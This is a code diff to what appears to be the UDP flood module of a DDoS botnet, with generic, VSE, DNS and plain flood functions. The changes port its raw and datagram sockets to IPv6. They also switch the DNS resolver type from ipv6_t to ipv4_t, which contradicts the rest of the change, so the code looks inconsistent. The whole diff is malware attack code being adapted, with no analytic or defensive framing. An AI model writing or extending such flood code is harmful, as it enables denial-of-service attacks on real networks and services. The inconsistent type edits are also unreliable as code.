@@ -20,7 +20,7 @@
 #include "table.h"
 #include "protocol.h"
 
-static ipv6_t get_dns_resolver(void);
+static ipv4_t get_dns_resolver(void);
 
 void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -39,7 +39,7 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
     if (data_len > 1460)
         data_len = 1460;
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_UDP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -142,7 +142,7 @@ void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     table_unlock_val(TABLE_ATK_VSE);
     vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_UDP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -241,7 +241,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 12);
     char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
     int domain_len;
-    ipv6_t dns_resolver = get_dns_resolver();
+    ipv4_t dns_resolver = get_dns_resolver();
 
     if (domain == NULL)
     {
@@ -252,7 +252,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     }
     domain_len = util_strlen(domain);
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_UDP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -411,7 +411,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         else
             targs[i].sock_addr.sin6_port = htons(dport);
 
-        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
+        if ((fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) == -1)
         {
 #ifdef DEBUG
             printf("Failed to create udp socket. Aborting attack\n");
@@ -476,7 +476,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
     }
 }
 
-static ipv6_t get_dns_resolver(void)
+static ipv4_t get_dns_resolver(void)
 {
     int fd;
 
